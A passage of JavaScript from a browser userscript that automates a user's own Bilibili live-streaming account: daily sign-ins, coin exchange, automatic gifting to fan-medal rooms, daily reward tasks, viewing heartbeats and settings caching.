                    if (config.AUTO_LOTTERY_CONFIG.MATERIAL_OBJECT_LOTTERY_CONFIG.CHECK_INTERVAL === undefined) config.AUTO_LOTTERY_CONFIG.MATERIAL_OBJECT_LOTTERY_CONFIG.CHECK_INTERVAL = Essential.Config.CONFIG_DEFAULT.AUTO_LOTTERY_CONFIG.MATERIAL_OBJECT_LOTTERY_CONFIG.CHECK_INTERVAL;
                    config.AUTO_LOTTERY_CONFIG.MATERIAL_OBJECT_LOTTERY_CONFIG.CHECK_INTERVAL = parseInt(config.AUTO_LOTTERY_CONFIG.MATERIAL_OBJECT_LOTTERY_CONFIG.CHECK_INTERVAL, 10);
                    if (config.AUTO_LOTTERY_CONFIG.MATERIAL_OBJECT_LOTTERY_CONFIG.CHECK_INTERVAL < 0) config.AUTO_LOTTERY_CONFIG.MATERIAL_OBJECT_LOTTERY_CONFIG.CHECK_INTERVAL = 0;

                    if (config.AUTO_DAILYREWARD_CONFIG.COIN_CONFIG.NUMBER === undefined) config.AUTO_DAILYREWARD_CONFIG.COIN_CONFIG.NUMBER = Essential.Config.CONFIG_DEFAULT.AUTO_DAILYREWARD_CONFIG.COIN_CONFIG.NUMBER;
                    config.AUTO_DAILYREWARD_CONFIG.COIN_CONFIG.NUMBER = parseInt(config.AUTO_DAILYREWARD_CONFIG.COIN_CONFIG.NUMBER, 10);
                    if (config.AUTO_DAILYREWARD_CONFIG.COIN_CONFIG.NUMBER < 0) config.AUTO_DAILYREWARD_CONFIG.COIN_CONFIG.NUMBER = 0;
                    if (config.AUTO_LOTTERY_CONFIG.STORM_CONFIG.STORM_QUEUE_SIZE < 0) config.AUTO_LOTTERY_CONFIG.STORM_CONFIG.STORM_QUEUE_SIZE = 1;
                    if (config.AUTO_LOTTERY_CONFIG.STORM_CONFIG.STORM_MAX_COUNT < 0) config.AUTO_LOTTERY_CONFIG.STORM_CONFIG.STORM_MAX_COUNT = 0;
                    if (config.AUTO_LOTTERY_CONFIG.STORM_CONFIG.STORM_ONE_LIMIT < 0) config.AUTO_LOTTERY_CONFIG.STORM_CONFIG.STORM_ONE_LIMIT = 1;
                    if($.type(CONFIG.AUTO_GIFT_CONFIG.ROOMID)!='array'){
                        CONFIG.AUTO_GIFT_CONFIG.ROOMID = [0];
                    }
                    if($.type(CONFIG.AUTO_GIFT_CONFIG.EXCLUDE_ROOMID)!='array'){
                        CONFIG.AUTO_GIFT_CONFIG.EXCLUDE_ROOMID = [0];
                    }
                    if (config.AUTO_GIFT_CONFIG.GIFT_INTERVAL === undefined) config.AUTO_GIFT_CONFIG.GIFT_INTERVAL = Essential.Config.AUTO_GIFT_CONFIG.GIFT_INTERVAL;
                    if (config.AUTO_GIFT_CONFIG.GIFT_INTERVAL < 1) config.AUTO_GIFT_CONFIG.GIFT_INTERVAL = 1;
                    if (config.AUTO_GIFT_CONFIG.GIFT_LIMIT === undefined) config.AUTO_GIFT_CONFIG.GIFT_LIMIT = Essential.Config.AUTO_GIFT_CONFIG.GIFT_LIMIT;
                    if (config.AUTO_GIFT_CONFIG.GIFT_LIMIT < 0) config.AUTO_GIFT_CONFIG.GIFT_LIMIT = 86400;
                    if (config.AUTO_LOTTERY_CONFIG.SLEEP_RANGE === undefined) config.AUTO_LOTTERY_CONFIG.SLEEP_RANGE = Essential.Config.AUTO_LOTTERY_CONFIG.SLEEP_RANGE;
                    if (config.DD_BP === undefined) config.DD_BP = Essential.Config.DD_BP;
                    if (config.DD_DM_STORM === undefined) config.DD_DM_STORM = Essential.Config.DD_DM_STORM;
                    return config;
                },
                _copy: (obj) => {
                    return JSON.parse(JSON.stringify(obj));
                },
                load: () => {
                    try {
                        CONFIG = JSON.parse(localStorage.getItem(`${NAME}_CONFIG`)) || {};
                        CONFIG = Essential.Config.fix(CONFIG);
                        if (Object.prototype.toString.call(CONFIG) !== '[object Object]') throw new Error();
                    } catch (e) {
                        CONFIG = Essential.Config._copy(Essential.Config.CONFIG_DEFAULT);
                    }
                    Essential.Config.recurLoad(CONFIG);
                    DEBUG('Essential.Config.load: CONFIG', CONFIG);
                    localStorage.setItem(`${NAME}_CONFIG`, JSON.stringify(CONFIG));
                    BiliPushUtils.Check.sleepTimeRangeBuild();
                },
                save: () => {
                    CONFIG = Essential.Config.recurSave(CONFIG);
                    CONFIG = Essential.Config.fix(CONFIG);
                    Essential.DataSync.down();
                    DEBUG('Essential.Config.save: CONFIG', CONFIG);
                    localStorage.setItem(`${NAME}_CONFIG`, JSON.stringify(CONFIG));
                    window.toast('设置已保存，部分设置需要刷新后生效', 'success');
                },
                clear: () => {
                    CONFIG = Essential.Config._copy(Essential.Config.CONFIG_DEFAULT);
                    Essential.DataSync.down();
                    localStorage.removeItem(`${NAME}_CONFIG`);
                }
            }, // Need Init After Toast.init and AlertDialog.init
            Cache: {
                load: () => {
                    try {
                        CACHE = JSON.parse(localStorage.getItem(`${NAME}_CACHE`));
                        if (Object.prototype.toString.call(CACHE) !== '[object Object]') throw new Error();
                        if (CACHE.version !== VERSION){
                            CACHE.version = VERSION;
                            //Essential.Cache.clear();
                        }
                    } catch (err) {
                        CACHE = {
                            version: VERSION
                        };
                        localStorage.setItem(`${NAME}_CACHE`, JSON.stringify(CACHE));
                    }
                    DEBUG('Essential.Cache.load: CACHE', CACHE);
                },
                save: () => {
                    localStorage.setItem(`${NAME}_CACHE`, JSON.stringify(CACHE));
                },
                clear: () => {
                    CACHE = {
                        version: VERSION
                    };
                    Essential.DataSync.down();
                    localStorage.removeItem(`${NAME}_CACHE`);
                }
            },
            DataSync: {
                init: () => {
                    window[NAME] = {};
                    window[NAME].iframeSet = new Set();
                },
                down: () => {
                    try {
                        window[NAME].Info = Info;
                        window[NAME].CONFIG = CONFIG;
                        window[NAME].CACHE = CACHE;
                        for (const iframe of window[NAME].iframeSet) {
                            if (iframe.promise.down) iframe.promise.down.resolve();
                        }
                    } catch (err) {
                    }
                }
            }
        }; // Only Run in MainScript, Need Init after Toast.init

        const Sign = {
            run: () => {
                try {
                    if (!CONFIG.AUTO_SIGN) return $.Deferred().resolve();
                    if (CACHE.sign_ts && !checkNewDay(CACHE.sign_ts)) {
                        // 同一天，不再检查签到
                        runTomorrow(Sign.run);
                        return $.Deferred().resolve();
                    }
                    return API.sign.doSign().then((response) => {
                        DEBUG('Sign.run: API.sign.doSign', response);
                        if (response.code === 0) {
                            // 签到成功
                            window.toast(`[自动签到]${response.data.text}`, 'success');
                            CACHE.sign_ts = ts_ms();
                            Essential.Cache.save();
                        } else if (response.code === -500 || response.message.indexOf('已') > -1) {
                            // 今天已签到过
                        } else {
                            window.toast(`[自动签到]${response.data.text}`, 'caution');
                            return Sign.run();
                        }
                        runTomorrow(Sign.run);
                    }, () => {
                        window.toast('[自动签到]签到失败，请检查网络', 'error');
                        return delayCall(() => Sign.run());
                    });
                } catch (err) {
                    window.toast('[自动签到]运行时出现异常，已停止', 'error');
                    console.error(`[${NAME}]`, err);
                    return $.Deferred().reject();
                }
            }
        }; // Once Run every day

        const Exchange = {
            run: () => {
                try {
                    if (!CONFIG.SILVER2COIN) return $.Deferred().resolve();
                    if (CACHE.exchange_ts && !checkNewDay(CACHE.exchange_ts)) {
                        // 同一天，不再兑换硬币
                        runTomorrow(Exchange.run);
                        return $.Deferred().resolve();
                    }
                    return Exchange.silver2coin().then(() => {
                        CACHE.exchange_ts = ts_ms();
                        Essential.Cache.save();
                        runTomorrow(Exchange.run);
                    }, () => delayCall(() => Exchange.run()));
                } catch (err) {
                    window.toast('[银瓜子换硬币]运行时出现异常，已停止', 'error');
                    console.error(`[${NAME}]`, err);
                    return $.Deferred().reject();
                }
            },
            silver2coin: () => {
                return API.Exchange.silver2coin().then((response) => {
                    DEBUG('Exchange.silver2coin: API.SilverCoinExchange.silver2coin', response);
                    if (response.code === 0) {
                        // 兑换成功
                        window.toast(`[银瓜子换硬币]${response.msg}`, 'success');
                    } else if (response.code === 403) {
                        // 每天最多能兑换 1 个
                        // 银瓜子余额不足
                        // window.toast(`[银瓜子换硬币]'${response.msg}`, 'info');
                    } else {
                        window.toast(`[银瓜子换硬币]${response.msg}`, 'caution');
                    }
                }, () => {
                    window.toast('[银瓜子换硬币]兑换失败，请检查网络', 'error');
                    return delayCall(() => Exchange.silver2coin());
                });
            }
        }; // Once Run every day

        const Gift = {
            interval: 600e3,
            run_timer: undefined,
            over:false,
            light_gift:30607,
            getMedalList:async () => {
                try{
                    let medal_list = [],curPage = 1,totalpages = 0;
                    do{
                        let response = await API.i.medal(curPage, 25);
                        DEBUG('Gift.getMedalList: API.i.medal', response);
                        medal_list = medal_list.concat(response.data.fansMedalList);
                        curPage = response.data.pageinfo.curPage;
                        totalpages = response.data.pageinfo.totalpages;
                        curPage++;
                    }while(curPage < totalpages);
                    return medal_list;
                }catch(e){
                    window.toast('[自动送礼]获取勋章列表失败，请检查网络', 'error');
                    return await delayCall(() => Gift.getMedalList());
                }
            },
            getBagList:async () => {
                try{
                    let response = await API.gift.bag_list();
                    DEBUG('Gift.getBagList: API.gift.bag_list', response);
                    Gift.time = response.data.time;
                    return response.data.list;
                }catch(e){
                    window.toast('[自动送礼]获取包裹列表失败，请检查网络', 'error');
                    return await delayCall(() => Gift.getBagList());
                }
            },
            getFeedByGiftID: (gift_id) => {
                for (let i = Info.gift_list.length - 1; i >= 0; --i) {
                    if (Info.gift_list[i].id === gift_id) {
                        return Math.ceil(Info.gift_list[i].price / 100);
                    }
                }
                return 0;
            },
            sort_medals:(medals)=>{
                if(CONFIG.AUTO_GIFT_CONFIG.GIFT_SORT){
                    medals.sort((a,b)=>{
                        if(b.level-a.level==0){
                            return b.intimacy-a.intimacy;
                        }
                        return b.level-a.level;
                    });
                }else{
                    medals.sort((a,b)=>{
                        if(a.level-b.level==0){
                            return a.intimacy-b.intimacy;
                        }
                        return a.level-b.level;
                    });
                }
                if(CONFIG.AUTO_GIFT_CONFIG.ROOMID && CONFIG.AUTO_GIFT_CONFIG.ROOMID.length>0){
                    let sortRooms = CONFIG.AUTO_GIFT_CONFIG.ROOMID;
                    sortRooms.reverse();
                    for(let froom of sortRooms){
                        let rindex = medals.findIndex(r=>r.roomid==froom);
                        if(rindex!=-1){
                            let tmp = medals[rindex];
                            medals.splice(rindex,1);
                            medals.unshift(tmp);
                        }
                    }
                }
                return medals;
            },
            auto_light:async(medal_list)=>{
                try{
                    const feed = Gift.getFeedByGiftID(Gift.light_gift);
                    let noLightMedals = medal_list.filter(it=>it.is_lighted==0 && it.day_limit-it.today_feed>=feed && CONFIG.AUTO_GIFT_CONFIG.EXCLUDE_ROOMID.findIndex(exp=>exp==it.roomid)==-1);
                    if(noLightMedals && noLightMedals.length>0){
                        noLightMedals = Gift.sort_medals(noLightMedals);
                        let bag_list = await Gift.getBagList();
                        let heartBags = bag_list.filter(r=>r.gift_id==Gift.light_gift);
                        if(heartBags && heartBags.length > 0){
                            for(let medal of noLightMedals){
                                let gift = heartBags.find(it=>it.gift_id==Gift.light_gift && it.gift_num > 0);
                                if(gift){
                                    let remain_feed = medal.day_limit - medal.today_feed;
                                    if(remain_feed - feed >= 0){
                                        let response = await API.room.room_init(parseInt(medal.roomid, 10));
                                        let send_room_id = parseInt(response.data.room_id, 10);
                                        let feed_num = 1;
                                        let rsp=await API.gift.bag_send(Info.uid, gift.gift_id, medal.target_id, feed_num, gift.bag_id, send_room_id, Info.rnd)
                                        if (rsp.code === 0) {
                                            gift.gift_num -= feed_num;
                                            medal.today_feed += feed_num * feed;
                                            remain_feed -= feed_num * feed;
                                            window.toast(`[自动送礼]勋章[${medal.medalName}] 点亮成功，送出${feed_num}个${gift.gift_name}，[${medal.today_feed}/${medal.day_limit}]距离升级还需[${remain_feed}]`, 'success');
                                        } else {
                                            window.toast(`[自动送礼]勋章[${medal.medalName}] 点亮异常:${response.msg}`, 'caution');
                                        }
                                    }
                                    continue;
                                }
                                break;
                            }
                        }
                    }
                }catch(e){
                    console.error(e);
                    window.toast(`[自动送礼]点亮勋章 检查出错:${e}`, 'error');
                }
            },
            run: async () => {
                const func = () => {
                    window.toast('[自动送礼]送礼失败，请检查网络', 'error');
                    return delayCall(() => Gift.run());
                };
                try {
                    if (!CONFIG.AUTO_GIFT) return;
                    if (Gift.run_timer) clearTimeout(Gift.run_timer);
                    Gift.interval = CONFIG.AUTO_GIFT_CONFIG.GIFT_INTERVAL * 60e3;
                    if (CACHE.gift_ts) {
                        const diff = ts_ms() - CACHE.gift_ts;
                        if (diff < Gift.interval) {
                            Gift.run_timer = setTimeout(Gift.run, Gift.interval - diff);
                            return;
                        }
                    }
                    Gift.over = false;
                    let medal_list = await Gift.getMedalList();
                    if(CONFIG.AUTO_GIFT_CONFIG.AUTO_LIGHT){
                        await Gift.auto_light(medal_list);
                    }
                    DEBUG('Gift.run: Gift.getMedalList().then: Gift.medal_list', medal_list);
                    if(medal_list && medal_list.length>0){
                        medal_list = medal_list.filter(it=>it.day_limit-it.today_feed>0 && it.level < 20);
                        medal_list = Gift.sort_medals(medal_list);
                        if(CONFIG.AUTO_GIFT_CONFIG.EXCLUDE_ROOMID && CONFIG.AUTO_GIFT_CONFIG.EXCLUDE_ROOMID.length>0){
                            medal_list = medal_list.filter(r=>CONFIG.AUTO_GIFT_CONFIG.EXCLUDE_ROOMID.findIndex(exp=>exp==r.roomid)==-1);
                        }
                        let bag_list = await Gift.getBagList();
                        for(let v of medal_list){
                            if(Gift.over) break;
                            let remain_feed = v.day_limit - v.today_feed;
                            if(remain_feed > 0){
                                let now = ts_s();
                                if(!CONFIG.AUTO_GIFT_CONFIG.SEND_ALL){
                                    //送之前查一次有没有可送的
                                    let pass = bag_list.filter(r=>![4, 3, 9, 10].includes(r.gift_id) && r.gift_num > 0 && r.expire_at > now && (r.expire_at - now < CONFIG.AUTO_GIFT_CONFIG.GIFT_LIMIT));
                                    if(pass.length==0){
                                        break;
                                    }else{
                                        bag_list = pass;
                                    }
                                }
                                window.toast(`[自动送礼]勋章[${v.medalName}] 今日亲密度未满[${v.today_feed}/${v.day_limit}]，预计需要[${Gift.remain_feed}]送礼开始`, 'info');
                                await Gift.sendGift(v,bag_list);
                            }else {
                                window.toast(`[自动送礼]勋章[${v.medalName}] 今日亲密度已满`, 'info');
                            }
                        }
                        CACHE.gift_ts = ts_ms();
                        Essential.Cache.save();
                    }
                    await delayCall(() => Gift.run(),Gift.interval);
                } catch (err) {
                    func();
                    window.toast('[自动送礼]运行时出现异常，已停止', 'error');
                    console.error(`[${NAME}]`, err);
                }
            },
            sendGift:async (medal,bag_list = []) => {
                if (Gift.time <= 0) Gift.time = ts_s();
                let ruid = medal.target_id;
                let remain_feed = medal.day_limit - medal.today_feed;
                if(remain_feed<=0){
                    window.toast(`[自动送礼]勋章[${medal.medalName}] 今日亲密度已满`, 'info');
                    return;
                }
                let response = await API.room.room_init(parseInt(medal.roomid, 10));
                let room_id = parseInt(response.data.room_id, 10);
                if(bag_list.length == 0){
                    bag_list = await Gift.getBagList();
                }
                let now = ts_s();
                if(!CONFIG.AUTO_GIFT_CONFIG.SEND_ALL){
                    //送之前查一次有没有可送的
                    let pass = bag_list.filter(r=>![4, 3, 9, 10].includes(r.gift_id) && r.gift_num > 0 && r.expire_at > now && (r.expire_at - now < CONFIG.AUTO_GIFT_CONFIG.GIFT_LIMIT));
                    if(pass.length == 0){
                        Gift.over = true;
                        return;
                    }else{
                        bag_list = pass;
                    }
                }
                for(const v of bag_list){
                    if (remain_feed <= 0) {
                        window.toast(`[自动送礼]勋章[${medal.medalName}] 送礼结束，今日亲密度已满[${medal.today_feed}/${medal.day_limit}]`, 'info');
                        return;
                    }
                    if ((
                        //特殊礼物排除
                        (![4, 3, 9, 10].includes(v.gift_id)
                         //满足到期时间
                         && v.expire_at > Gift.time && (v.expire_at - Gift.time < CONFIG.AUTO_GIFT_CONFIG.GIFT_LIMIT)
                        )
                        //或者全部送满
                        || CONFIG.AUTO_GIFT_CONFIG.SEND_ALL)
                        //永久礼物不自动送
                        && v.expire_at > Gift.time){
                        // 检查SEND_ALL和礼物到期时间 送当天到期的
                        const feed = Gift.getFeedByGiftID(v.gift_id);
                        if (feed > 0) {
                            let feed_num = Math.floor(remain_feed / feed);
                            if (feed_num > v.gift_num) feed_num = v.gift_num;
                            if (feed_num > 0) {
                                try{
                                    let response = API.gift.bag_send(Info.uid, v.gift_id, ruid, feed_num, v.bag_id, room_id, Info.rnd);
                                    DEBUG('Gift.sendGift: API.gift.bag_send', response);
                                    if (response.code === 0) {
                                        v.gift_num -= feed_num;
                                        medal.today_feed += feed_num * feed;
                                        remain_feed -= feed_num * feed;
                                        window.toast(`[自动送礼]勋章[${medal.medalName}] 送礼成功，送出${feed_num}个${v.gift_name}，[${medal.today_feed}/${medal.day_limit}]距离升级还需[${Gift.remain_feed}]`, 'success');
                                    } else {
                                        window.toast(`[自动送礼]勋章[${medal.medalName}] 送礼异常:${response.msg}`, 'caution');
                                    }
                                }catch(e){
                                    window.toast('[自动送礼]包裹送礼失败，请检查网络', 'error');
                                    return await delayCall(() => Gift.sendGift(medal));
                                }
                            }
                        }
                    }
                }
            }
        }; // Once Run every 10 minutes

        const GroupSign = {
            getGroups: () => {
                return API.Group.my_groups().then((response) => {
                    DEBUG('GroupSign.getGroups: API.Group.my_groups', response);
                    if (response.code === 0) return $.Deferred().resolve(response.data.list);
                    window.toast(`[自动应援团签到]'${response.msg}`, 'caution');
                    return $.Deferred().reject();
                }, () => {
                    window.toast('[自动应援团签到]获取应援团列表失败，请检查网络', 'error');
                    return delayCall(() => GroupSign.getGroups());
                });
            },
            signInList: (list, i = 0) => {
                if (i >= list.length) return $.Deferred().resolve();
                const obj = list[i];
                //自己不能给自己的应援团应援
                if(obj.owner_uid==Info.uid) return GroupSign.signInList(list, i + 1);
                return API.Group.sign_in(obj.group_id, obj.owner_uid).then((response) => {
                    DEBUG('GroupSign.signInList: API.Group.sign_in', response);
                    const p = $.Deferred();
                    if (response.code === 0) {
                        if (response.data.add_num > 0) {
                            window.toast(`[自动应援团签到]应援团(group_id=${obj.group_id},owner_uid=${obj.owner_uid})签到成功，当前勋章亲密度+${response.data.add_num}`, 'success');
                            p.resolve();
                        } else if (response.data.status === 1) {
                            p.resolve();
                        } else {
                            p.reject();
                        }
                    } else {
                        window.toast(`[自动应援团签到]'${response.msg}`, 'caution');
                        return GroupSign.signInList(list, i);
                    }
                    return $.when(GroupSign.signInList(list, i + 1), p);
                }, () => {
                    window.toast(`[自动应援团签到]应援团(group_id=${obj.group_id},owner_uid=${obj.owner_uid})签到失败，请检查网络`, 'error');
                    return delayCall(() => GroupSign.signInList(list, i));
                });
            },
            run: () => {
                try {
                    if (!CONFIG.AUTO_GROUP_SIGN) return $.Deferred().resolve();
                    if (CACHE.group_sign_ts && !checkNewDay(CACHE.group_sign_ts)) {
                        // 同一天，不再检查应援团签到
                        runTomorrow(GroupSign.run);
                        return $.Deferred().resolve();
                    }
                    return GroupSign.getGroups().then((list) => {
                        return GroupSign.signInList(list).then(() => {
                            CACHE.group_sign_ts = ts_ms();
                            runTomorrow(GroupSign.run);
                        }, () => delayCall(() => GroupSign.run()));
                    }, () => delayCall(() => GroupSign.run()));
                } catch (err) {
                    window.toast('[自动应援团签到]运行时出现异常，已停止', 'error');
                    console.error(`[${NAME}]`, err);
                    return $.Deferred().reject();
                }
            }
        }; // Once Run every day "api.live.bilibili.com"
        const DailyReward = {
            coin_exp: 0,
            login: () => {
                return API.DailyReward.login().then(() => {
                    DEBUG('DailyReward.login: API.DailyReward.login');
                    window.toast('[自动每日奖励][每日登录]完成', 'success');
                }, () => {
                    window.toast('[自动每日奖励][每日登录]完成失败，请检查网络', 'error');
                    return delayCall(() => DailyReward.login());
                });
            },
            watch: (aid, cid) => {
                if (!CONFIG.AUTO_DAILYREWARD_CONFIG.WATCH) return $.Deferred().resolve();
                return API.DailyReward.watch(aid, cid, Info.uid, ts_s()).then((response) => {
                    DEBUG('DailyReward.watch: API.DailyReward.watch', response);
                    if (response.code === 0) {
                        window.toast(`[自动每日奖励][每日观看]完成(av=${aid})`, 'success');
                    } else {
                        window.toast(`[自动每日奖励][每日观看]'${response.msg}`, 'caution');
                    }
                }, () => {
                    window.toast('[自动每日奖励][每日观看]完成失败，请检查网络', 'error');
                    return delayCall(() => DailyReward.watch(aid, cid));
                });
            },
            coin: (cards, n, i = 0, one = false) => {
                if (!CONFIG.AUTO_DAILYREWARD_CONFIG.COIN) return $.Deferred().resolve();
                if (DailyReward.coin_exp >= CONFIG.AUTO_DAILYREWARD_CONFIG.COIN_CONFIG.NUMBER * 10) {
                    window.toast('[自动每日奖励][每日投币]今日投币已完成', 'info');
                    return $.Deferred().resolve();
                }
                if (i >= cards.length) {
                    window.toast('[自动每日奖励][每日投币]动态里可投币的视频不足', 'caution');
                    return $.Deferred().resolve();
                }
                const obj = JSON.parse(cards[i].card);
                let num = Math.min(2, n);
                if (one) num = 1;
                return API.DailyReward.coin(obj.aid, num).then((response) => {
                    DEBUG('DailyReward.coin: API.DailyReward.coin', response);
                    if (response.code === 0) {
                        DailyReward.coin_exp += num * 10;
                        window.toast(`[自动每日奖励][每日投币]投币成功(av=${obj.aid},num=${num})`, 'success');
                        return DailyReward.coin(cards, n - num, i + 1);
                    } else if (response.code === -110) {
                        window.toast('[自动每日奖励][每日投币]未绑定手机，已停止', 'error');
                        return $.Deferred().reject();
                    } else if (response.code === 34003) {
                        // 非法的投币数量
                        if (one) return DailyReward.coin(cards, n, i + 1);
                        return DailyReward.coin(cards, n, i, true);
                    } else if (response.code === 34005) {
                        // 塞满啦！先看看库存吧~
                        return DailyReward.coin(cards, n, i + 1);
                    }
                    window.toast(`[自动每日奖励][每日投币]'${response.msg}`, 'caution');
                    return DailyReward.coin(cards, n, i + 1);
                }, () => delayCall(() => DailyReward.coin(cards, n, i)));
            },
            share: (aid) => {
                if (!CONFIG.AUTO_DAILYREWARD_CONFIG.SHARE) return $.Deferred().resolve();
                return API.DailyReward.share(aid).then((response) => {
                    DEBUG('DailyReward.share: API.DailyReward.share', response);
                    if (response.code === 0) {
                        window.toast(`[自动每日奖励][每日分享]分享成功(av=${aid})`, 'success');
                    } else if (response.code === 71000) {
                        // 重复分享
                        window.toast('[自动每日奖励][每日分享]今日分享已完成', 'info');
                    } else {
                        window.toast(`[自动每日奖励][每日分享]'${response.msg}`, 'caution');
                    }
                }, () => {
                    window.toast('[自动每日奖励][每日分享]分享失败，请检查网络', 'error');
                    return delayCall(() => DailyReward.share(aid));
                });
            },
            dynamic: () => {
                return API.dynamic_svr.dynamic_new(Info.uid, 8).then((response) => {
                    DEBUG('DailyReward.dynamic: API.dynamic_svr.dynamic_new', response);
                    if (response.code === 0) {
                        if (response.data.cards[0]) {
                            const obj = JSON.parse(response.data.cards[0].card);
                            const p1 = DailyReward.watch(obj.aid, obj.cid);
                            const p2 = DailyReward.coin(response.data.cards, Math.max(CONFIG.AUTO_DAILYREWARD_CONFIG.COIN_CONFIG.NUMBER - DailyReward.coin_exp / 10, 0));
                            const p3 = DailyReward.share(obj.aid);
                            return $.when(p1, p2, p3);
                        } else {
                            window.toast('[自动每日奖励]"动态-投稿视频"中暂无动态', 'info');
                        }
                    } else {
                        window.toast(`[自动每日奖励]获取"动态-投稿视频"'${response.msg}`, 'caution');
                    }
                }, () => {
                    window.toast('[自动每日奖励]获取"动态-投稿视频"失败，请检查网络', 'error');
                    return delayCall(() => DailyReward.dynamic());
                });
            },
            run: () => {
                try {
                    if (!CONFIG.AUTO_DAILYREWARD) return $.Deferred().resolve();
                    if (CACHE.dailyreward_ts && !checkNewDay(CACHE.dailyreward_ts)) {
                        // 同一天，不执行每日任务
                        runTomorrow(DailyReward.run);
                        return $.Deferred().resolve();
                    }
                    return API.DailyReward.exp().then((response) => {
                        DEBUG('DailyReward.run: API.DailyReward.exp', response);
                        if (response.code === 0) {
                            DailyReward.coin_exp = response.number;
                            DailyReward.login();
                            return DailyReward.dynamic().then(() => {
                                CACHE.dailyreward_ts = ts_ms();
                                runTomorrow(DailyReward.run);
                            });
                        } else {
                            window.toast(`[自动每日奖励]${response.message}`, 'caution');
                        }
                    }, () => {
                        window.toast('[自动每日奖励]获取每日奖励信息失败，请检查网络', 'error');
                        return delayCall(() => DailyReward.run());
                    });
                } catch (err) {
                    window.toast('[自动每日奖励]运行时出现异常', 'error');
                    console.error(`[${NAME}]`, err);
                    return $.Deferred().reject();
                }
            }
        }; // Once Run every day "api.live.bilibili.com"
        const Task = {
            interval: 600e3,
            double_watch_task: false,
            run_timer: undefined,
            MobileHeartbeat: false,
            PCHeartbeat:false,
            run: async () => {
                try {
                    if (!CONFIG.AUTO_TASK) return $.Deferred().resolve();
                    if (!Info.mobile_verify) {
                        window.toast('[自动完成任务]未绑定手机，已停止', 'caution');
                        return $.Deferred().resolve();
                    }
                    if (Task.run_timer) clearTimeout(Task.run_timer);
                    if (CACHE.task_ts && !Task.MobileHeartbeat && !Task.PCHeartbeat) {
                        const diff = ts_ms() - CACHE.task_ts;
                        if (diff < Task.interval) {
                            Task.run_timer = setTimeout(Task.run, Task.interval - diff);
                            return $.Deferred().resolve();
                        }
                    }
                    if (Task.MobileHeartbeat) Task.MobileHeartbeat = false;
                    if (Task.PCHeartbeat) Task.PCHeartbeat = false;
                    return API.i.taskInfo().then(async (response) => {
                        DEBUG('Task.run: API.i.taskInfo', response);
                        for (const key in response.data) {
                            if (typeof response.data[key] === 'object') {
                                if (response.data[key].task_id && response.data[key].status === 1) {
                                    await Task.receiveAward(response.data[key].task_id);
                                }else if (response.data[key].task_id === 'double_watch_task'){
                                    if(response.data[key].status === 0){
                                        Task.double_watch_task = false;
                                        if(Token && TokenUtil && Info.appToken && !Task.double_watch_task){
                                            await BiliPushUtils.API.Heart.mobile_info();
                                        }
                                    }else if(response.data[key].status === 2){
                                        Task.double_watch_task = true;
                                    }else{
                                        Task.double_watch_task = false;
                                    }
                                }
                            }
                        }
                    }).always(() => {
                        CACHE.task_ts = ts_ms();
                        localStorage.setItem(`${NAME}_CACHE`, JSON.stringify(CACHE));
                        Task.run_timer = setTimeout(Task.run, Task.interval);
                    }, () => delayCall(() => Task.run()));
                } catch (err) {
                    window.toast('[自动完成任务]运行时出现异常，已停止', 'error');
                    console.error(`[${NAME}]`, err);
                    return $.Deferred().reject();
                }
            },
            receiveAward: async (task_id) => {
                return API.activity.receive_award(task_id).then((response) => {
                    DEBUG('Task.receiveAward: API.activity.receive_award', response);
                    if (response.code === 0) {
                        // 完成任务
                        window.toast(`[自动完成任务]完成任务：${task_id}`, 'success');
                        if (task_id === 'double_watch_task') Task.double_watch_task = true;
                    } else if (response.code === -400) {
                        // 奖励已领取
                        // window.toast(`[自动完成任务]${task_id}: ${response.msg}`, 'info');
                    } else {
                        window.toast(`[自动完成任务]${task_id}: ${response.msg}`, 'caution');
                    }
                }, () => {
                    window.toast('[自动完成任务]完成任务失败，请检查网络', 'error');
                    return delayCall(() => Task.receiveAward(task_id));
                });
            }
        }; // Once Run every 10 minutes
        const MobileHeartbeat = {
            run_timer: undefined,
            run:async () => {
                try {
                    if (!CONFIG.MOBILE_HEARTBEAT) return $.Deferred().resolve();
                    if(Task.double_watch_task) return $.Deferred().resolve();
                    if (MobileHeartbeat.run_timer && !Task.double_watch_task && Info.mobile_verify) {
                        Task.MobileHeartbeat = true;
                        Task.run();
                    }
                    if (MobileHeartbeat.run_timer) clearTimeout(MobileHeartbeat.run_timer);
                    //API.HeartBeat.mobile
                    BiliPushUtils.API.Heart.mobile().then((rsp) => {
                        DEBUG('MobileHeartbeat.run: API.HeartBeat.mobile');
                        MobileHeartbeat.run_timer = setTimeout(MobileHeartbeat.run, 300e3);
                    }, () => delayCall(() => MobileHeartbeat.run()));
                } catch (err) {
                    window.toast('[移动端心跳]运行时出现异常，已停止', 'error');
                    console.error(`[${NAME}]`, err);
                    return $.Deferred().reject();
                }
            }
        }; // Once Run every 5mins
        const WebHeartbeat = {
            run_timer: undefined,
            run: () => {
                try {
                    if (!CONFIG.MOBILE_HEARTBEAT) return $.Deferred().resolve();
                    if (WebHeartbeat.run_timer && !Task.double_watch_task && Info.mobile_verify) {
                        Task.WebHeartbeat = true;
                        Task.run();
                    }
                    if (WebHeartbeat.run_timer) clearTimeout(WebHeartbeat.run_timer);
                    API.HeartBeat.web().then(() => {
                        DEBUG('MobileHeartbeat.run: API.HeartBeat.web');
                        WebHeartbeat.run_timer = setTimeout(WebHeartbeat.run, 300e3);
                    }, () => delayCall(() => WebHeartbeat.run()));
                } catch (err) {
                    window.toast('[WEB端心跳]运行时出现异常，已停止', 'error');
                    console.error(`[${NAME}]`, err);
                    return $.Deferred().reject();
                }
            }
        }; // Once Run every 5mins

        const TreasureBox = {
            timer: undefined,
            time_end: undefined,
            time_start: undefined,
            promise: {
                calc: undefined,
                timer: undefined
            },
            DOM: {
                image: undefined,
                canvas: undefined,
                div_tip: undefined,
                div_timer: undefined
            },
            init: () => {
                if (!CONFIG.AUTO_TREASUREBOX) return $.Deferred().resolve();
                const p = $.Deferred();
                runUntilSucceed(() => {
                    try {
                        if ($('.draw-box.gift-left-part').length) {
                            window.toast('[自动领取瓜子]当前直播间有实物抽奖，暂停领瓜子功能', 'caution');
                            p.resolve();
                            return true;
                        }
                        let treasure_box = $('#gift-control-vm div.treasure-box.p-relative');
                        if (!treasure_box.length) return false;
                        treasure_box = treasure_box.first();
                        treasure_box.attr('id', 'old_treasure_box');
                        treasure_box.hide();
                        const div = $(`<div id="${NAME}_treasure_div" class="treasure-box p-relative" style="min-width: 46px;display: inline-block;float: left;padding: 22px 0 0 15px;"></div>`);
                        TreasureBox.DOM.div_tip = $(`<div id="${NAME}_treasure_div_tip" class="t-center b-box none-select">自动<br>领取中</div>`);
